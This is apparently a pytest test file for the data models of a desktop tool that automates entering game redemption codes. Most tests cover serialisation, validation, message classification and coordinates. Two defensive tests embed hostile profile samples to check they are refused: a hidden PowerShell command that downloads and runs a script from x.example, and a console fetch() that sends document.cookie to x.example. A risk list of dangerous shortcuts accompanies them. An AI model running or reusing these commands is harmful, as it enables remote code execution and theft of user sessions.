"""Tests for autopress.models (OWNED BY A1)."""

from __future__ import annotations

import dataclasses
import inspect
import json
import random

import pytest

from autopress import i18n
from autopress import models as m
from autopress.textutil import fuzzy_contains, squash

ALL_DATACLASSES = [obj for _n, obj in inspect.getmembers(m, inspect.isclass)
                   if dataclasses.is_dataclass(obj) and obj.__module__ == m.__name__]


def json_roundtrip(obj: object) -> object:
    data = json.loads(json.dumps(m.to_dict(obj), ensure_ascii=False))
    return m.from_dict(type(obj), data)


# ----------------------------------------------------------------------------- serialisation


@pytest.mark.parametrize("cls", ALL_DATACLASSES, ids=lambda c: c.__name__)
def test_every_dataclass_defaults_and_roundtrips(cls: type) -> None:
    obj = cls()
    again = json_roundtrip(obj)
    assert m.to_dict(again) == m.to_dict(obj)


def test_profile_roundtrip_with_every_step(sample_profile: m.Profile) -> None:
    again = json_roundtrip(sample_profile)
    assert m.to_dict(again) == m.to_dict(sample_profile)
    assert [s.type for s in again.steps] == [s.type for s in sample_profile.steps]
    assert isinstance(again.steps[1].params, m.ClickPointParams)
    assert isinstance(again.steps[1].params.point, m.ClientPoint)


def test_unknown_keys_ignored_missing_defaulted() -> None:
    s = m.settings_from_dict({"theme": "light", "bogus": 1, "hotkeys": {"stop": "F10", "extra": True}})
    assert s.theme is m.ThemeName.LIGHT
    assert s.hotkeys.stop == "F10" and s.hotkeys.pause_resume == "F8"
    assert s.countdown_s == 3


def test_invalid_values_fall_back_and_numbers_clamp() -> None:
    s = m.settings_from_dict({"countdown_s": 99, "failsafe_margin_px": "7", "pause_on_user_input": "yes",
                              "theme": "neon", "language": 5, "history_skip_statuses": ["success", "nope"]})
    assert s.countdown_s == 10  # clamped to the range (0, 10)
    assert s.failsafe_margin_px == 7  # numeric string accepted
    assert s.pause_on_user_input is True  # invalid -> default
    assert s.theme is m.ThemeName.DARK and s.language is m.Language.AUTO
    assert s.history_skip_statuses == [m.CodeStatus.SUCCESS]  # invalid element dropped
    p = m.from_dict(m.ClickPointParams, {"jitter_px": -5, "hold_ms": 1e9, "button": "left"})
    assert p.jitter_px == 0 and p.hold_ms == 5000


def test_bool_and_int_are_not_confused() -> None:
    p = m.from_dict(m.KeyParams, {"repeat": True, "keys": 3})
    assert p.repeat == 1 and p.keys == "Enter"


def test_non_mapping_data_gives_defaults() -> None:
    assert m.to_dict(m.from_dict(m.Settings, ["x"])) == m.to_dict(m.Settings())
    assert m.profile_from_dict("nope").steps == []


def test_unknown_step_type_is_preserved() -> None:
    data = m.to_dict(m.Profile(name="x"))
    data["steps"] = [{"type": "click_image", "params": {"template": "a.png", "threshold": 0.9}, "id": "s1",
                      "enabled": True, "label": "future"}]
    p = m.profile_from_dict(data)
    step = p.steps[0]
    assert step.type is m.StepType.UNKNOWN and isinstance(step.params, m.UnknownParams)
    assert p.enabled_steps() == []  # skipped at run time
    assert m.to_dict(p)["steps"][0] == data["steps"][0]  # saved back verbatim
    issues = [i for i in p.validate() if i.step_index == 0]
    assert issues and issues[0].level is m.IssueLevel.WARNING


def test_step_params_must_match_type() -> None:
    with pytest.raises(TypeError):
        m.Step(type=m.StepType.KEY, params=m.WaitParams())
    with pytest.raises(ValueError):
        m.make_step(m.StepType.UNKNOWN)


def test_newer_schema_is_loaded_best_effort() -> None:
    data = m.to_dict(m.Profile(name="new"))
    data["schema_version"] = 99
    data["future_field"] = {"a": 1}
    p = m.profile_from_dict(data)
    assert p.name == "new" and p.schema_version == 99


def test_migration_hook(monkeypatch: pytest.MonkeyPatch) -> None:
    calls = []

    def v0_to_v1(d: dict) -> dict:
        calls.append(d.get("schema_version"))
        out = dict(d)
        out["name"] = out.pop("title", "")
        return out

    monkeypatch.setitem(m._MIGRATIONS["profile"], 0, v0_to_v1)
    p = m.profile_from_dict({"schema_version": 0, "title": "舊名稱"})
    assert calls == [0] and p.name == "舊名稱" and p.schema_version == m.PROFILE_SCHEMA_VERSION


def test_clone_identity(sample_profile: m.Profile) -> None:
    same = sample_profile.clone(new_identity=False)
    assert m.to_dict(same) == m.to_dict(sample_profile)
    other = sample_profile.clone()
    assert other.id != sample_profile.id
    assert all(a.id != b.id for a, b in zip(other.steps, sample_profile.steps))
    other.steps[1].params.point.dx += 1  # deep copy
    assert sample_profile.steps[1].params.point.dx != other.steps[1].params.point.dx


# ----------------------------------------------------------------------------- profile


def test_sample_profile_has_no_errors(sample_profile: m.Profile) -> None:
    errors = [i for i in sample_profile.validate() if i.level is m.IssueLevel.ERROR]
    assert errors == []
    assert sample_profile.uses_ocr() and sample_profile.has_result_check()
    assert sample_profile.missing_setup() == []
    assert sample_profile.reference_sizes() == {(1280, 720)}


def test_validation_reports_paths_and_steps() -> None:
    p = m.Profile(name="p")
    p.steps = [m.make_step(m.StepType.CLICK_POINT), m.make_step(m.StepType.KEY),
               m.make_step(m.StepType.CLICK_TEXT), m.make_step(m.StepType.TYPE_CODE)]
    p.steps[1].params.keys = "Ctrl+Nope"
    p.steps[2].params.text = "(["
    p.steps[2].params.match = m.TextMatch.REGEX
    p.steps[3].params.split = m.SplitMode.FIXED
    p.target.title, p.target.title_mode = "[", m.TitleMatch.REGEX
    errors = {i.path for i in p.validate() if i.level is m.IssueLevel.ERROR}
    assert {"steps[0].params.point", "steps[1].params.keys", "steps[2].params.text",
            "steps[3].params.group_sizes", "target.title"} <= errors
    assert p.missing_setup() == [(0, "point")]
    p.code_format.groups = [5, 5, 5]
    assert "steps[3].params.group_sizes" not in {i.path for i in p.validate()}


def test_disabled_steps_are_not_validated() -> None:
    p = m.Profile(name="p", steps=[m.make_step(m.StepType.CLICK_POINT), m.make_step(m.StepType.TYPE_CODE)])
    p.steps[0].enabled = False
    assert not [i for i in p.validate() if i.level is m.IssueLevel.ERROR]


def test_describe_actions(sample_profile: m.Profile) -> None:
    text = sample_profile.describe_actions()
    assert text.startswith("此設定檔會：") and "點擊 2 處" in text and "輸入序號" in text and "按 Enter" in text
    i18n.set_language("en")
    assert m.Profile().describe_actions() == "This profile does nothing"
    assert m.Settings().daily_cap == 0 and m.settings_from_dict({"daily_cap": -4}).daily_cap == 0


def test_game_key() -> None:
    assert m.Profile(game="原神 Genshin").game_key() == "game:原神genshin"
    p = m.Profile(game="")
    assert p.game_key() == f"profile:{p.id}"


def test_make_step_uses_delays() -> None:
    d = m.DelaySettings(after_focus_ms=500, after_click_ms=300, key_delay_ms=40)
    assert m.make_step(m.StepType.FOCUS_WINDOW, d).params.settle_ms == 500
    assert m.make_step(m.StepType.CLICK_TEXT, d).params.after_ms == 300
    assert m.make_step(m.StepType.TYPE_CODE, d).params.key_delay_ms == 40


@pytest.mark.parametrize("lang", ["zh-TW", "en"])
def test_labels_and_summaries_exist(lang: str) -> None:
    i18n.set_language(lang)
    for enum_cls in (m.CodeStatus, m.ResultClass, m.CodeSource, m.StepType, m.TypingMode, m.ClearMethod,
                     m.SplitMode, m.BetweenSegments, m.TextMatch, m.MouseButton, m.CoordMode, m.TitleMatch,
                     m.RunSelection, m.RunState, m.PauseReason, m.StopReason):
        for member in enum_cls:
            assert member.label().strip(), member
    for st in m.StepType:
        if st is not m.StepType.UNKNOWN:
            step = m.make_step(st)
            assert step.display_title() and isinstance(step.summary(), str)
    assert m.CodeStatus.SUCCESS.label() == ("成功" if lang == "zh-TW" else "Redeemed")


def test_status_helpers() -> None:
    assert {s for s in m.CodeStatus if s.is_runnable} == {m.CodeStatus.PENDING, m.CodeStatus.COOLDOWN}
    assert m.CodeStatus.SUBMITTED.is_done and not m.CodeStatus.FAILED.is_done
    assert m.status_for_result(None) is m.CodeStatus.SUBMITTED
    assert m.status_for_result(m.ResultClass.RATE_LIMITED) is m.CodeStatus.COOLDOWN
    assert m.status_for_result(m.ResultClass.UNKNOWN) is m.CodeStatus.REVIEW
    assert m.status_for_result(m.ResultClass.INELIGIBLE) is m.CodeStatus.FAILED
    assert {s.tone for s in m.CodeStatus} <= {"neutral", "warning", "accent", "success", "violet", "error", "orange", "info"}


# ----------------------------------------------------------------------------- keywords


U3_MESSAGES = [  # docs/research/scripts/ocr/bench_u3.py + HoYoverse API strings (ux.md section 4)
    ("兌換成功", "success"), ("序號已被使用", "used"), ("兌換碼無效", "invalid"), ("兌換碼已過期", "expired"),
    ("操作過於頻繁，請稍後再試", "rate_limited"), ("獎勵已發送至信箱", "success"),
    ("兑换成功", "success"), ("兑换码已被使用", "used"), ("兑换码无效", "invalid"), ("兑换码已过期", "expired"),
    ("操作过于频繁，请稍后再试", "rate_limited"),
    ("Redeemed successfully", "success"), ("This code has already been used", "used"), ("Invalid code", "invalid"),
    ("Code expired", "expired"), ("Too many requests. Please try again later.", "rate_limited"),
    ("交換に成功しました", "success"), ("このコードは既に使用されています", "used"), ("無効なコードです", "invalid"),
    ("有効期限切れです", "expired"), ("しばらくしてから再度お試しください", "rate_limited"),
    ("Redemption code has been claimed already.", "used"), ("Redemption code has expired.", "expired"),
    ("Invalid redemption code.", "invalid"), ("Redemption is on cooldown.", "rate_limited"),
    ("已達使用上限", "ineligible"), ("兌換未成功", "unknown"), ("Redemption unsuccessful", "unknown"),
    ("Redeemed succesfully", "success"),  # one OCR edit in a long Latin keyword
]

CRITIQUE_MESSAGES = [  # spec_critique_tech.md T05 and spec_critique_product.md PX-04 (decision log)
    ("This code cannot be redeemed in your region.", "ineligible"),
    ("The code could not be redeemed. Please check the code.", "unknown"),
    ("Redeemed successfully! Rewards expire in 7 days.", "success"),
    ("Redeemed successfully! Rewards were sent to your in-game mail. Mail expires in 30 days.", "success"),
    ("兌換成功！獎勵已發送至信箱，請於過期前領取", "success"),
    ("兌換成功，道具將於 7 天後過期", "success"),
    ("兌換成功！獎勵已發送至信箱，請於7天內領取，逾期將過期", "success"),
    ("Account not bound to a character", "unknown"),
    ("兌換碼兌換 請輸入兌換碼 兌換碼過期後將無法兌換", "unknown"),  # static page text
    ("兌換成功\n此序號已被使用", "unknown"),  # SUCCESS together with another class: ambiguous
    ("未能成功兌換，請確認序號", "unknown"),  # negation next to a SUCCESS keyword
    ("Code was not redeemed successfully", "unknown"),
    ("Gift code claimed! Check your in-game mail.", "success"),  # "code claimed", not bare "claimed"
    ("Code redeemed. Your item expires on 2026-12-31.", "success"),
    ("This code has been redeemed already.", "used"),
    ("兌換成功，請稍後再到信箱查收", "success"),  # 稍後再到 is not 稍後再試
    ("Gift code successfully redeemed! Not available in the shop.", "unknown"),  # SUCCESS + INELIGIBLE
]


@pytest.mark.parametrize(("text", "expected"), U3_MESSAGES + CRITIQUE_MESSAGES)
def test_default_keywords_classify_reference_messages(text: str, expected: str) -> None:
    cls, kw = m.KeywordConfig().classify(text)
    assert cls.value == expected
    assert (kw == "") is (cls is m.ResultClass.UNKNOWN)


def test_classify_rule_details() -> None:
    cfg = m.KeywordConfig()
    assert cfg.classify("") == (m.ResultClass.UNKNOWN, "")
    assert cfg.classify("Mail expires soon")[0] is m.ResultClass.UNKNOWN  # "expired" is too short for fuzzy
    assert cfg.classify("Code expired")[1] == "expired"
    assert fuzzy_contains(squash("successfully"), squash("Redeemed succesfully"), min_len=m.FUZZY_MIN_LEN)
    strict = m.KeywordConfig(fuzzy=False)
    assert strict.classify("Redeemed succesfully")[0] is m.ResultClass.UNKNOWN
    custom = m.KeywordConfig(order=[m.ResultClass.SUCCESS] + [c for c in m.DEFAULT_CLASS_ORDER
                                                               if c is not m.ResultClass.SUCCESS])
    assert custom.classify("兌換成功 已使用")[0] is m.ResultClass.UNKNOWN  # ambiguity ignores the order
    assert not any("ko" in langs for langs in m.DEFAULT_KEYWORDS.values())


def test_default_keywords_do_not_overlap() -> None:
    assert m.KeywordConfig().overlaps() == []
    cfg = m.KeywordConfig()
    cfg.groups[m.ResultClass.SUCCESS].append("已被使用")
    assert cfg.overlaps() and cfg.overlaps()[0][0] == "已被使用"


def test_keyword_config_after_load_completes_order() -> None:
    cfg = m.from_dict(m.KeywordConfig, {"groups": {"used": ["x"], "unknown": ["y"]}, "order": ["success", "success", "unknown"]})
    assert cfg.order[0] is m.ResultClass.SUCCESS and len(cfg.order) == 6 and m.ResultClass.UNKNOWN not in cfg.order
    assert cfg.groups[m.ResultClass.USED] == ["x"] and cfg.groups[m.ResultClass.EXPIRED] == []
    assert m.ResultClass.UNKNOWN not in cfg.groups


# ----------------------------------------------------------------------------- coordinates


def test_point_roundtrip_same_size_all_modes() -> None:
    rnd = random.Random(7)
    for _ in range(300):
        cl = (rnd.randint(-3840, 1900), rnd.randint(-200, 900), rnd.randint(1, 2560), rnd.randint(1, 1440))
        px, py = cl[0] + rnd.randrange(cl[2]), cl[1] + rnd.randrange(cl[3])
        for anchor in m.Anchor:
            p = m.record_point(cl, px, py, anchor)
            for mode in m.CoordMode:
                assert m.resolve_point(cl, p, mode) == (px, py)
        rw, rh = rnd.randint(1, cl[2] - (px - cl[0])), rnd.randint(1, cl[3] - (py - cl[1]))
        r = m.record_region(cl, px, py, rw, rh)
        for mode in m.CoordMode:
            assert m.resolve_region(cl, r, mode) == (px, py, rw, rh)


def test_point_scales_with_ratio() -> None:
    small, big = (100, 50, 1280, 720), (-1800, 40, 1920, 1080)
    rnd = random.Random(3)
    for _ in range(200):
        dx, dy = rnd.randrange(1280), rnd.randrange(720)
        gx, gy = m.resolve_point(big, m.record_point(small, small[0] + dx, small[1] + dy))
        assert abs((gx - big[0] + 0.5) - (dx + 0.5) * 1.5) <= 0.5
        assert abs((gy - big[1] + 0.5) - (dy + 0.5) * 1.5) <= 0.5


def test_anchors_keep_edge_distance() -> None:
    p = m.record_point((0, 0, 800, 600), 790, 590, m.Anchor.BR)
    assert m.resolve_point((10, 20, 1000, 700), p, m.CoordMode.OFFSET) == (1000, 710)
    c = m.record_point((0, 0, 800, 600), 400, 300, "center")
    assert m.resolve_point((0, 0, 1000, 700), c, "offset") == (500, 350)
    r = m.record_region((0, 0, 800, 600), 200, 100, 300, 80)
    assert m.resolve_region((0, 0, 1000, 750), r) == (250, 125, 375, 100)  # live check of wb_coords.py


def test_coordinate_helpers() -> None:
    with pytest.raises(ValueError):
        m.record_point((0, 0, 0, 10), 1, 1)
    assert m.point_in_rect((0, 0, 10, 10), 9, 9) and not m.point_in_rect((0, 0, 10, 10), 10, 0)
    assert m.intersect_rect((0, 0, 10, 10), (5, 5, 10, 10)) == (5, 5, 5, 5)
    assert m.intersect_rect((0, 0, 10, 10), (10, 0, 5, 5)) is None


# ----------------------------------------------------------------------------- keys, charsets, codes


@pytest.mark.parametrize(("text", "expected"), [
    ("enter", ["Enter"]), ("ctrl+a", ["Ctrl", "A"]), ("Shift + Tab", ["Shift", "Tab"]),
    ("alt+ctrl+del", ["Ctrl", "Alt", "Delete"]), ("F9", ["F9"]), ("esc", ["Esc"]), ("pgdn", ["PageDown"]),
])
def test_parse_combo_names(text: str, expected: list[str]) -> None:
    assert m.parse_combo_names(text) == expected
    assert m.normalize_combo(text) == "+".join(expected)


@pytest.mark.parametrize("text", ["", "ctrl", "ctrl+", "a+b", "ctrl+ctrl+a", "hyper+x", "F25"])
def test_parse_combo_names_rejects(text: str) -> None:
    with pytest.raises(ValueError):
        m.parse_combo_names(text)


@pytest.mark.parametrize(("combo", "ok"), [
    ("F8", True), ("Ctrl+Shift+F9", True), ("Alt+P", True), ("Ctrl+1", True),
    ("A", False), ("Shift+A", False), ("Win+F1", False), ("F12", False), ("bad", False),
])
def test_validate_hotkey(combo: str, ok: bool) -> None:
    assert (m.validate_hotkey(combo) is None) is ok


def test_hotkey_settings_repair() -> None:
    s = m.settings_from_dict({"hotkeys": {"pause_resume": "A", "stop": "Win+F1"}})
    assert (s.hotkeys.pause_resume, s.hotkeys.stop) == ("F8", "F9")
    s = m.settings_from_dict({"hotkeys": {"pause_resume": "f10", "stop": "F10"}})
    assert (s.hotkeys.pause_resume, s.hotkeys.stop) == ("F8", "F9")
    assert m.Settings().validate() == []


def test_expand_charset() -> None:
    assert m.expand_charset("A-HJ-NP-Y0-9") == "0123456789ABCDEFGHJKLMNPQRSTUVWXY"
    assert m.expand_charset("-A-C") == "-ABC"
    with pytest.raises(ValueError):
        m.expand_charset("Z-A")
    with pytest.raises(ValueError):
        m.expand_charset("")
    assert m.CodeFormat(charset="a-c", case_sensitive=False).allowed_chars() == "ABC"
    assert m.CodeFormat(charset="a-c", case_sensitive=True).allowed_chars() == "abc"
    assert m.CodeFormat(charset="z-a").allowed_chars() == ""
    bad = m.CodeFormat(charset="z-a", min_len=9, max_len=3, groups=[0], regex="(")
    assert len(bad.validate()) == 4


def test_code_key() -> None:
    assert m.code_key(" ABCD-1234_ef gh ") == "ABCD1234efgh"


# ----------------------------------------------------------------------------- OCR / windows


def _line(text: str, x: float, y: float, w: float = 80, h: float = 20) -> m.OcrLine:
    return m.OcrLine(text=text, quad=[(x, y), (x + w, y), (x + w, y + h), (x, y + h)], score=0.99)


def test_ocr_rows_reading_order() -> None:
    res = m.OcrResult(lines=[_line("碼", 200, 52), _line("兌換", 10, 50), _line("AB12-CD34", 10, 100, 160)],
                      width=400, height=200, origin=(1000, 500))
    rows = res.rows()
    assert [r.text for r in rows] == ["兌換 碼", "AB12-CD34"]
    assert rows[0].line_indices == [1, 0]
    assert res.text() == "兌換 碼\nAB12-CD34"
    assert res.lines[1].bounds() == (10, 50, 80, 20) and res.lines[1].center() == (50.0, 60.0)
    assert res.to_screen(50.4, 60.6) == (1050, 561)


def test_target_match() -> None:
    t = m.TargetMatch(exe="Chrome.exe", title="兌換", title_mode=m.TitleMatch.CONTAINS)
    assert t.matches("C:/Program Files/Google/chrome.exe", "Genshin 兌換頁 - Chrome", "Chrome_WidgetWin_1")
    assert not t.matches("C:/x/firefox.exe", "兌換", "")
    assert m.TargetMatch(title=r"^Game \d+$", title_mode=m.TitleMatch.REGEX).matches("", "game 12", "")
    assert not m.TargetMatch(title="Game", title_mode=m.TitleMatch.EXACT).matches("", "Game 2", "")
    assert m.TargetMatch(class_name="UnityWndClass").matches("", "", "UnityWndClass")
    assert m.TargetMatch().is_empty() and not t.is_empty()
    info = m.WindowInfo(hwnd=5, title="Game", class_name="C", pid=9, exe_path="D:\\Games\\game.exe")
    assert info.exe_name == "game.exe"
    assert info.to_target().matches(info.exe_path, info.title, info.class_name)


def test_preflight_report_ok() -> None:
    rep = m.PreflightReport(issues=[m.PreflightIssue(level=m.IssueLevel.WARNING)])
    assert rep.ok
    rep.issues.append(m.PreflightIssue(level=m.IssueLevel.ERROR))
    assert not rep.ok


def test_candidate_confidence() -> None:
    assert m.CodeCandidate(char_confs=[0.9, 0.7, 0.99]).confidence == 0.7
    assert m.CodeCandidate().confidence is None


# ----------------------------------------------------------------------------- SPEC v2 revision (A2)


@pytest.mark.parametrize(("combo", "level"), [
    ("Win+R", m.IssueLevel.ERROR), ("Ctrl+Win+D", m.IssueLevel.ERROR), ("Alt+F4", m.IssueLevel.ERROR),
    ("Alt+Tab", m.IssueLevel.ERROR), ("Ctrl+Shift+Esc", m.IssueLevel.ERROR), ("Ctrl+Esc", m.IssueLevel.ERROR),
    ("Ctrl+Alt+Delete", m.IssueLevel.ERROR), ("Alt+Space", m.IssueLevel.ERROR),
    ("Ctrl+L", m.IssueLevel.WARNING), ("Alt+D", m.IssueLevel.WARNING), ("Ctrl+W", m.IssueLevel.WARNING),
    ("Enter", None), ("Esc", None), ("Ctrl+A", None), ("Shift+Tab", None), ("nonsense", None),
    # integration (gate G-02): developer tools, page source and paste are refused
    ("F12", m.IssueLevel.ERROR), ("Ctrl+Shift+I", m.IssueLevel.ERROR), ("Ctrl+Shift+J", m.IssueLevel.ERROR),
    ("Ctrl+Shift+C", m.IssueLevel.ERROR), ("Ctrl+Shift+K", m.IssueLevel.ERROR), ("Ctrl+U", m.IssueLevel.ERROR),
    ("Ctrl+V", m.IssueLevel.ERROR), ("Shift+Insert", m.IssueLevel.ERROR), ("Ctrl+Shift+V", m.IssueLevel.ERROR),
])
def test_combo_risk(combo: str, level: m.IssueLevel | None) -> None:
    assert m.combo_risk(combo)[0] is level


def test_hostile_shared_profile_is_refused_and_disarmed() -> None:
    """PX-01 / T15: explorer.exe + Win+R + a fixed command + Enter."""
    p = m.Profile(name="free gems", target=m.TargetMatch(exe="explorer.exe", title_mode=m.TitleMatch.ANY,
                                                         allow_same_process=True))
    p.steps = [m.make_step(m.StepType.KEY), m.make_step(m.StepType.TYPE_TEXT), m.make_step(m.StepType.KEY),
               m.make_step(m.StepType.TYPE_CODE)]
    p.steps[0].params.keys = "Win+R"
    p.steps[0].label = "等待"  # a label must not disguise the step in the summary
    p.steps[1].params.text = "powershell -w hidden -c iwr x.example/a.ps1|iex"
    issues = p.validate()
    errors = {i.path for i in issues if i.level is m.IssueLevel.ERROR}
    assert {"target.exe", "steps[0].params.keys"} <= errors
    assert any(i.path == "steps[1].params.text" and i.level is m.IssueLevel.WARNING for i in issues)
    lines = p.action_lines()
    assert len(lines) == 4 and lines[0][1] and lines[1][1] and not lines[3][1]
    assert "Win+R" in lines[0][0] and "powershell" in lines[1][0] and "等待" not in lines[0][0]
    p.prepare_import()
    assert p.target.is_empty() and not p.target.allow_same_process and p.suggested_exe == ""
    q = m.Profile(target=m.TargetMatch(exe="Game.exe", title="Game"), last_test_ok_at="x")
    q.prepare_import()
    assert q.suggested_exe == "Game.exe" and q.target == m.TargetMatch() and q.last_test_ok_at == ""


def test_devtools_script_profile_is_flagged() -> None:
    """Gate G-02: the reviewer's probe - a chrome profile opens the console and types script with
    {code} inside; the key step is an ERROR, the text line and the run rules are highlighted."""
    p = m.Profile(name="faster", target=m.TargetMatch(exe="chrome.exe", title="兌換"))
    p.steps = [m.make_step(m.StepType.KEY), m.make_step(m.StepType.TYPE_TEXT), m.make_step(m.StepType.TYPE_CODE)]
    p.steps[0].params.keys = "Ctrl+Shift+J"
    p.steps[1].params.text = 'fetch("https://x.example/?"+document.cookie+"{code}")\n'
    p.policy.stop_after_failures, p.policy.pause_after_invalid, p.policy.max_cooldowns = 0, 0, 20
    issues = p.validate()
    assert any(i.path == "steps[0].params.keys" and i.level is m.IssueLevel.ERROR for i in issues)
    assert any(i.path == "steps[1].params.text" and i.level is m.IssueLevel.WARNING for i in issues)
    lines = p.action_lines()
    assert lines[0][1] and lines[1][1] and "↵" in lines[1][0] and "\n" not in lines[1][0]
    rules = p.policy_lines()
    assert len(rules) == 3 and all(risky for _t, risky in rules)
    assert m.Profile().policy_lines() == []


def test_address_bar_shortcuts_are_refused_for_browser_targets() -> None:
    p = m.Profile(target=m.TargetMatch(exe="msedge.exe", title="兌換"))
    p.steps = [m.make_step(m.StepType.KEY)]
    p.steps[0].params.keys = "Ctrl+L"
    assert any(i.path == "steps[0].params.keys" and i.level is m.IssueLevel.ERROR for i in p.validate())
    p.target = m.TargetMatch()  # an import: no target yet, the author's program is a browser
    p.suggested_exe = "chrome.exe"
    assert any(i.path == "steps[0].params.keys" and i.level is m.IssueLevel.ERROR for i in p.validate())
    p.suggested_exe = "game.exe"
    assert [i.level for i in p.validate() if i.path == "steps[0].params.keys"] == [m.IssueLevel.WARNING]


def test_text_is_risky_and_ocr_check_summary() -> None:
    assert m.text_is_risky("a\nb") and m.text_is_risky("x\ty") and m.text_is_risky(" JavaScript :alert(1)")
    assert not m.text_is_risky("/redeem {code}") and not m.text_is_risky("metadata: {code}")
    oc = m.make_step(m.StepType.OCR_CHECK)
    assert oc.summary() in ("尚未設定結果範圍", "Result region not set")


def test_target_with_unknown_exe_needs_class_or_exact_title() -> None:
    """Gate G-03: exe "" matches a window of ANY program."""
    loose = m.TargetMatch(exe="", title="兌換", title_mode=m.TitleMatch.CONTAINS)
    assert loose.exe_unknown()
    assert any(i.path == "target.exe" and i.level is m.IssueLevel.ERROR for i in m.Profile(target=loose).validate())
    assert not m.TargetMatch(exe="", title="兌換", title_mode=m.TitleMatch.EXACT).exe_unknown()
    assert not m.TargetMatch(exe="", class_name="UnityWndClass").exe_unknown()
    assert not m.TargetMatch().exe_unknown() and not m.TargetMatch(exe="game.exe", title="x").exe_unknown()


def test_browser_target_needs_title() -> None:
    p = m.Profile(target=m.TargetMatch(exe="Chrome.exe", title=""))
    assert p.target.needs_title() and "target.title" in {i.path for i in p.validate() if i.level is m.IssueLevel.ERROR}
    p.target.title = "兌換"
    assert not p.target.needs_title()
    assert not m.TargetMatch(exe="game.exe").needs_title() and m.TargetMatch(exe="CMD.EXE").is_forbidden()


def test_step_label_follows_language() -> None:
    s = m.Step(type=m.StepType.CLICK_POINT, params=m.ClickPointParams(), label="點一下序號輸入框",
               label_en="Click the code box")
    assert s.display_title() == "點一下序號輸入框"
    i18n.set_language("en")
    assert s.display_title() == "Click the code box"
    s.label_en = ""
    assert s.display_title() == "點一下序號輸入框"
    data = m.to_dict(m.Step(type=m.StepType.WAIT, params=m.WaitParams(), label_en="Wait"))
    assert data["label_en"] == "Wait" and m.from_dict(m.Step, data).label_en == "Wait"


def test_corrupt_point_loads_as_not_set() -> None:
    """T20: an unusable recorded point must block the run, not click the client's top-left."""
    p = m.from_dict(m.ClickPointParams, {"point": {"dx": "abc", "dy": None, "rx": "?", "ref_w": 0}})
    assert p.point is None
    p = m.from_dict(m.ClickPointParams, {"point": {"dx": 5, "dy": 6, "ref_w": 100}})  # rx / ry missing
    assert p.point is None
    good = m.to_dict(m.record_point((0, 0, 100, 100), 5, 6))
    assert m.from_dict(m.ClickPointParams, {"point": good}).point == m.record_point((0, 0, 100, 100), 5, 6)
    r = m.from_dict(m.OcrCheckParams, {"region": {"dx": 1, "dy": 1, "w": "big"}})
    assert r.region is None
    prof = m.Profile(steps=[m.make_step(m.StepType.CLICK_POINT), m.make_step(m.StepType.OCR_CHECK)])
    assert prof.missing_setup() == [(0, "point"), (1, "region")]
    assert "steps[1].params.region" in {i.path for i in prof.validate() if i.level is m.IssueLevel.ERROR}


def test_positional_lists_are_rejected_whole() -> None:
    """T21: [1, "a"] must not become [1]."""
    s = m.settings_from_dict({"minibar_pos": [1, "a"]})
    assert s.minibar_pos == []
    assert m.settings_from_dict({"minibar_pos": [1, 2, 3]}).minibar_pos == []
    assert m.settings_from_dict({"minibar_pos": [10, 20]}).minibar_pos == [10, 20]
    assert m.from_dict(m.CodeFormat, {"groups": [5, "x", -1]}).groups == []
    assert m.from_dict(m.CodeFormat, {"groups": [5, 5, 5]}).groups == [5, 5, 5]
    assert m.from_dict(m.OcrLine, {"quad": [[0, 0], [1, "y"], [1, 1], [0, 1]]}).quad == []


def test_failsafe_corners() -> None:
    """T04 / PX-12: this PC has a second monitor LEFT of the primary."""
    assert m.failsafe_corners([(0, 0, 1920, 1080)]) == [(0, 0)]
    here = [(0, 0, 1920, 1080), (-1920, 0, 1920, 1080)]
    assert m.failsafe_corners(here) == [(-1920, 0)]
    assert m.in_failsafe_corner(-1918, 2, here, 3) and not m.in_failsafe_corner(0, 0, here, 3)
    stacked = [(0, 0, 1920, 1080), (0, -1080, 1920, 1080)]
    assert m.failsafe_corners(stacked) == [(0, -1080)]
    offset = [(0, 0, 1920, 1080), (1920, 300, 1280, 720)]  # right monitor lower: its corner touches the primary
    assert m.failsafe_corners(offset) == [(0, 0)]
    high = [(0, 300, 1920, 1080), (1920, 0, 1280, 720)]  # right monitor higher: both corners are outer corners
    assert m.failsafe_corners(high) == [(0, 300), (1920, 0)]
    assert m.failsafe_corners([]) == [(0, 0)]


def test_offset_mode_scales_with_dpi() -> None:
    """PX-16: a web page recorded at 96 DPI and replayed at 120 DPI grows by 1.25 from the top-left."""
    rec = m.record_point((0, 0, 1920, 969), 960, 297, dpi=96)
    assert m.resolve_point((0, 0, 1920, 959), rec, "offset", dpi=120) == (1200, 371)
    assert m.resolve_point((0, 0, 1920, 969), rec, "offset", dpi=96) == (960, 297)
    assert m.resolve_point((0, 0, 1920, 969), rec, "auto", dpi=120) == m.resolve_point((0, 0, 1920, 969), rec, "ratio")
    reg = m.record_region((0, 0, 800, 600), 100, 50, 200, 40, dpi=96)
    assert m.resolve_region((10, 10, 1000, 750), reg, "offset", dpi=144) == (160, 85, 300, 60)


def test_first_submit_index() -> None:
    def prof(*types: m.StepType) -> m.Profile:
        return m.Profile(steps=[m.make_step(t) for t in types])

    S = m.StepType
    assert prof(S.FOCUS_WINDOW, S.CLICK_POINT, S.TYPE_CODE, S.WAIT, S.KEY, S.OCR_CHECK).first_submit_index() == 4
    assert prof(S.CLICK_POINT, S.TYPE_CODE, S.OCR_CHECK).first_submit_index() == 1  # auto-submitting page
    assert prof(S.WAIT, S.CLICK_TEXT, S.KEY).first_submit_index() == 1  # no type_code
    assert prof(S.WAIT, S.OCR_CHECK).first_submit_index() == -1


def test_revised_defaults() -> None:
    s = m.Settings()
    assert s.history_skip_statuses == [m.CodeStatus.SUCCESS, m.CodeStatus.USED]  # PX-05
    assert s.ocr.threads == 4 and s.resume_countdown_s == 2  # T34, T14
    assert m.CodeStatus.SUBMITTED.label() == "已送出（未確認）"
    fmt = m.CodeFormat()
    assert fmt.case_sensitive and fmt.allowed_chars() == m.expand_charset("A-Za-z0-9")  # PX-19: generic keeps case
    assert m.RunPolicy().pause_after_invalid == 3  # PX-06
    assert m.code_key("MAPLE_2026-GIFT") == "MAPLE2026GIFT"
    p = m.Profile(steps=[m.make_step(m.StepType.TYPE_CODE)])
    assert any(i.level is m.IssueLevel.WARNING and "辨識結果" in i.message for i in p.validate())  # PX-05
    p.policy.on_unknown = m.UnknownAction.CONTINUE
    assert "policy.on_unknown" in {i.path for i in p.validate()}  # PX-09
    assert set(m.PREFLIGHT_KEYS) >= {"target_forbidden", "unassigned_codes", "untested_profile", "estimate"}
    assert all(not r.opens_main_window for r in (m.PauseReason.USER, m.PauseReason.USER_INPUT))
    assert m.PauseReason.UNKNOWN_RESULT.opens_main_window and m.PauseReason.INVALID_STREAK.opens_main_window


